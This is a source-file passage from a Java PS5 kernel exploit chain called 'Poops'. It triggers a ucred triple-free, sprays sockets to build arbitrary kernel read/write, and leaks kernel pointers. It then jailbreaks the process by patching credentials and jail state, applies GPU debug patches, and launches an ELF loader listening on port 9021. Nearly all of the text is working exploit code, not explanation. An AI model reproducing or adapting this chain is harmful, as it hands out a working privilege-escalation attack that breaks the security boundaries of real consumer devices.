        if (mfp != 0 && vfp != 0) break;
        api.call(tail_schedYield);
      }
      if (mfp == 0 || vfp == 0) return null;

      long mso = kread64(mfp);
      long vso = kread64(vfp);
      long mpcb = kread64(mso + 0x18);
      long vpcb = kread64(vso + 0x18);
      long mp = kread64(mpcb + INPCB_PKTOPTS);
      long vp = kread64(vpcb + INPCB_PKTOPTS);
      if (mp == 0 || vp == 0) return null;

      if (!Poops.looksKernelPtr(mp) || !Poops.looksKernelPtr(vp)) {
        return null;
      }
      kwrite32(mfp + 0x28, kread32(mfp + 0x28) + 1);
      kwrite32(vfp + 0x28, kread32(vfp + 0x28) + 1);
      kwrite64(mp + 0x10, vp + 0x10);
      return new long[]{ms, vs};
    }

    private static void load(long fdOfiles, String fw) {
      String elfResource = "/elfldr_1001.elf";
      try {
        float fwNum = Float.parseFloat(fw);
        if (fwNum > 10.01f) {
          elfResource = "/elfldr_1200.elf";
        }
      } catch (Throwable e) {
      }
      Buffer store = loadElfFromJar(elfResource);
      if (store == null) {
        log("[!] ELF loader: loader resource could not be loaded.");
        return;
      }

      long[] pipeData = createElfPipes(fdOfiles);
      long[] socketData = createOverlappedSockets(fdOfiles);
      if (pipeData == null || socketData == null) {
        log("[!] ELF loader: failed to create pipe/socket environment.");
        return;
      }

      rwpipe = new Buffer(8);
      rwpipe.putInt(0, (int) pipeData[0]);
      rwpipe.putInt(4, (int) pipeData[1]);
      rwpair = new Buffer(8);
      rwpair.putInt(0, (int) socketData[0]);
      rwpair.putInt(4, (int) socketData[1]);
      payloadout = new Buffer(4);
      payloadout.putInt(0, 0);

      args = new Buffer(0x30);
      args.putLong(0x00, tail_getpid);
      args.putLong(0x08, rwpipe.address());
      args.putLong(0x10, rwpair.address());
      args.putLong(0x18, pipeData[2]);
      args.putLong(0x20, dataBase);
      args.putLong(0x28, payloadout.address());

      th = new Buffer(8);
      at = new Buffer(0x100);
      api.call(tail_pthreadAttrInit, at.address());
      api.call(tail_pthreadAttrSetstacksize, at.address(), 0x80000L);
      if (tail_pthreadAttrSetdetachstate != 0) {
        api.call(tail_pthreadAttrSetdetachstate, at.address(), 1);
      }
      threadName = new Buffer(8);
      threadName.put(0, "elfldr\0".getBytes());
      long entry = mapElf(store);
      if (entry == 0) {
        log("[!] ELF loader: fixed-address mapping failed; loader not started.");
        return;
      }
      log("[*] Launching native thread...");
      long ret = api.call(tail_scePthreadCreate, th.address(), at.address(), entry, args.address(), threadName.address());
      api.call(tail_pthreadAttrDestroy, at.address());
      if (ret == 0) {
        ksleep(ELF_LOADER_BOOT_WAIT_MS);
        screenLog("[+] ELF loader: native thread started, port 9021 should be open.");
      } else {
        log("[!] scePthreadCreate failed: ".concat(String.valueOf(ret)));
      }
    }
  }

  private void runPoopsTail(long curproc) {
    boolean loaderReady = false;
    try {
      log("[*] Kernel post-exploit: resolving firmware offsets for native PS5 process.");
      if (!resolveTailSyscalls()) {
        log("[!] Kernel post-exploit: could not resolve required libkernel syscalls.");
        return;
      }

      String realFw = getRealFirmware();
      if (realFw == null) {
        log("[!] Firmware detection: could not read kern.sdk_version.");
        return;
      }
      log("[i] Firmware detection: running FW ".concat(realFw));
      if (!initOffsets(realFw)) {
        log("[!] Firmware offsets: unsupported firmware.");
        return;
      }
      log("[+] Firmware offsets: kernel offsets loaded.");

      dataBase = findDataBaseFromKnownAllproc(allproc);
      if (dataBase == 0) {
        dataBase = findDataBase(curproc);
      }
      if (dataBase == 0) {
        log("[!] Kernel base: dataBase lookup failed.");
        return;
      }
      log("[+] Kernel base: dataBase = ".concat(hx64(dataBase)));

      log("[+] Native syscalls: current process is already PS5 native; sysent swap skipped.");

      if (GPU.setup(curproc)) {
        screenLog("[+] GPU DMA: configured kernel mapping; applying debug settings patches.");
        GPU.patchDebug();
        if (GPU.gpuFd >= 0) {
          close(GPU.gpuFd);
          GPU.gpuFd = -1;
        }
      } else {
        log("[!] GPU DMA: setup failed.");
      }
      log("[*] ELF loader: injecting standalone loader into JIT mapping.");
      ElfLoader.load(fdt_ofiles, realFw);
      loaderReady = true;
      Thread.sleep(POST_ELF_LOADER_WAIT_MS);
    } catch (Throwable e) {
      log("[!] Kernel post-exploit stage failed: ".concat(String.valueOf(e)));
    } finally {
      try {
        restoreJailbreak();
        log("[+] Cleanup safety: filesystem root and jail state restored for clean exit.");
      } catch (Throwable e) {
        log("[!] Cleanup safety: filesystem root and jail restore failed: ".concat(String.valueOf(e)));
      }
      nullKernelApiPipeFds();
      log("[+] Cleanup safety: temporary kernel R/W pipe FDs removed from fd table.");
    }

    if (loaderReady && SEND_HELPER_ELFS) {
      try {
        screenLog("[+] Autoloader helper: sending ps5_autoload.elf");
        sendElf("/ps5_autoload.elf");
        screenLog("[+] Autoloader helper: sending ps5_killdiscplayer.elf");
        sendElf("/ps5_killdiscplayer.elf");
      } catch (Throwable e) {
        log("[!] Autoloader helper: send failed: ".concat(String.valueOf(e)));
      }
    } else if (loaderReady) {
      log("[*] Autoloader helper: helper ELFs disabled for this build.");
    }
    log("[*] Kernel post-exploit: loader/helper stage finished.");
  }

  private void setup() {
    log("[*] Exploit setup: creating socket pairs, worker threads and IPv6 spray sockets.");
    // Create socket pair for uio spraying.
    socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
    uioSs0 = uioSs.get(0);
    uioSs1 = uioSs.get(1);
    // Create socket pair for iov spraying.
    socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
    iovSs0 = iovSs.get(0);
    iovSs1 = iovSs.get(1);
    // Create iov threads.
    for (int i = 0; i < IOV_THREAD_NUM; i++) {
      iovThreads[i] = new IovThread(iovState);
      iovThreads[i].start();
    }
    // Create uio threads.
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
      uioThreads[i] = new UioThread(uioState);
      uioThreads[i].start();
    }
    // Set up sockets for spraying.
    for (int i = 0; i < ipv6Socks.length; i++) {
      ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
    }
    // Initialize pktopts.
    for (int i = 0; i < ipv6Socks.length; i++) {
      freeRthdr(ipv6Socks[i]);
    }
    log("[+] Exploit setup: socket spray initialized.");
  }

  private void cleanup() throws InterruptedException {
    // Close all files.
    for (int i = 0; i < ipv6Socks.length; i++) {
      close(ipv6Socks[i]);
    }

    close(uioSs1);
    close(uioSs0);
    close(iovSs1);
    close(iovSs0);

    // Stop uio threads.
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
      uioThreads[i].interrupt();
      uioThreads[i].join();
    }

    // Stop iov threads.
    for (int i = 0; i < IOV_THREAD_NUM; i++) {
      iovThreads[i].interrupt();
      iovThreads[i].join();
    }
  }

  public boolean trigger() throws Exception {
    Status.setNetworkLoggerEnabled(false);

    cpusetSetAffinity(MAIN_CORE);
    rtprioThread(256);

    setup();

    // Trigger vulnerability.
    triggerUcredTripleFree();

    // Leak pointers from kqueue.
    leakKqueue();

    // Leak fd_files from kq_fdp.
    long fd_files = kreadSlow64(kq_fdp);
    fdt_ofiles = fd_files + 0x08;
    log("[+] Kernel leak: fdt_ofiles = ".concat(hx64(fdt_ofiles)));

    long masterRpipeFile =
            kreadSlow64(fdt_ofiles + kapi.getMasterPipeFd().get(0) * FILEDESCENT_SIZE);

    long victimRpipeFile =
            kreadSlow64(fdt_ofiles + kapi.getVictimPipeFd().get(0) * FILEDESCENT_SIZE);

    long masterRpipeData = kreadSlow64(masterRpipeFile + 0x00);

    long victimRpipeData = kreadSlow64(victimRpipeFile + 0x00);
    log("[+] Pipe pivot: master pipe data = ".concat(hx64(masterRpipeData)));
    log("[+] Pipe pivot: victim pipe data = ".concat(hx64(victimRpipeData)));

    // Corrupt pipebuf of masterRpipeFd.
    Buffer masterPipebuf = new Buffer(PIPEBUF_SIZE);
    masterPipebuf.putInt(0x00, 0); // cnt
    masterPipebuf.putInt(0x04, 0); // in
    masterPipebuf.putInt(0x08, 0); // out
    masterPipebuf.putInt(0x0C, PAGE_SIZE); // size
    masterPipebuf.putLong(0x10, victimRpipeData); // buffer
    kwriteSlow(masterRpipeData, masterPipebuf);

    // Increase reference counts for the pipes.
    fhold(fget(kapi.getMasterPipeFd().get(0)));
    fhold(fget(kapi.getMasterPipeFd().get(1)));
    fhold(fget(kapi.getVictimPipeFd().get(0)));
    fhold(fget(kapi.getVictimPipeFd().get(1)));

    // Remove rthdr pointers from triplets.
    for (int i = 0; i < triplets.length; i++) {
      removeRthrFromSocket(ipv6Socks[triplets[i]]);
    }

    // Remove triple freed file from free list.
    removeUafFile();
    screenLog("[+] Kernel R/W: arbitrary read/write primitive established.");

    // Find allproc.
    allproc = findAllProc();
    screenLog("[+] Process lookup: allproc = ".concat(hx64(allproc)));
    int currentPid = getpid();
    screenLog("[*] Process lookup: current pid = ".concat(String.valueOf(currentPid)));
    long curproc = pfind(currentPid);
    screenLog("[+] Process lookup: current proc = ".concat(hx64(curproc)));
    saveFlowRestoreState(curproc);

    // Jailbreak.
    screenLog("[*] Jailbreak: patching credentials, root directory and dynlib limits.");
    jailbreak();
    screenLog("[+] Jailbreak: process privileges patched.");
    runPoopsTail(curproc);
    screenLog("[*] Exploit cleanup: stopping worker threads and closing spray sockets.");
    cleanup();
    screenLog("[+] Exploit cleanup: complete.");
    return true;
  }

  class WorkerState {
    private final int totalWorkers;

    private int workersStartedWork = 0;
    private int workersFinishedWork = 0;

    private int workCommand = -1;

    public WorkerState(int totalWorkers) {
      this.totalWorkers = totalWorkers;
    }

    public synchronized void signalWork(int command) {
      workersStartedWork = 0;
      workersFinishedWork = 0;
      workCommand = command;
      notifyAll();

      while (workersStartedWork < totalWorkers) {
        try {
          wait();
        } catch (InterruptedException e) {
          // Ignore.
        }
      }
    }

    public synchronized void waitForFinished() {
      while (workersFinishedWork < totalWorkers) {
        try {
          wait();
        } catch (InterruptedException e) {
          // Ignore.
        }
      }

      workCommand = -1;
    }

    public synchronized int waitForWork() throws InterruptedException {
      while (workCommand == -1 || workersFinishedWork != 0) {
        wait();
      }

      workersStartedWork++;
      if (workersStartedWork == totalWorkers) {
        notifyAll();
      }

      return workCommand;
    }

    public synchronized void signalFinished() {
      workersFinishedWork++;
      if (workersFinishedWork == totalWorkers) {
        notifyAll();
      }
    }
  }

  class IovThread extends Thread {
    private final WorkerState state;

    public IovThread(WorkerState state) {
      this.state = state;
    }

    public void run() {
      cpusetSetAffinity(MAIN_CORE);
      rtprioThread(256);

      try {
        while (true) {
          state.waitForWork();

          // Allocate iov and block thread.
          recvmsg(iovSs0, msg, 0);

          state.signalFinished();
        }
      } catch (InterruptedException e) {
        // Ignore.
      }
    }
  }

  class UioThread extends Thread {
    private final WorkerState state;

    public UioThread(WorkerState state) {
      this.state = state;
    }

    public void run() {
      cpusetSetAffinity(MAIN_CORE);
      rtprioThread(256);

      try {
        while (true) {
          int command = state.waitForWork();

          // Allocate uio and block thread.
          if (command == COMMAND_UIO_READ) {
            writev(uioSs1, uioIovRead, UIO_IOV_NUM);
          } else if (command == COMMAND_UIO_WRITE) {
            readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
          }

          state.signalFinished();
        }
      } catch (InterruptedException e) {
        // Ignore.
      }
    }
  }

  public static void main(String[] args) {
    try {
      Status.setScreenOutputEnabled(true);
      Status.setNetworkLoggerEnabled(false);
      initTcpLog();
      screenLog("=========================================");
      screenLog("[*] POOPS EXPLOIT + ELF AUTOLOADER");
      screenLog("[*] Stage 1: ExploitNetControl kernel primitive");
      screenLog("[*] Stage 2: Poops jailbreak/debug patches/ELF autoloader");
      screenLog("[*] Original by Andy Nguyen; modified by MassZero and owendswang.");
      screenLog("=========================================");
      if (alreadyJailbroken()) {
        screenLog("[!] Startup guard: process is already jailbroken/root (uid=0).");
        screenLog("[!] Startup guard: aborting before Poops exploit to avoid a second run.");
        return;
      }
      if (!verifySleepHealth(SLEEP_HEALTHCHECK_MS)) {
        log("[!] Startup healthcheck failed; aborting before Poops exploit.");
        return;
      }
      new Poops().trigger();
    } catch (Exception e) {
      log("[!] Fatal error in Poops: ".concat(String.valueOf(e)));
      Status.printStackTrace("[!] Fatal error in Poops", e);
    } finally {
      closeTcpLog();
    }
  }
}
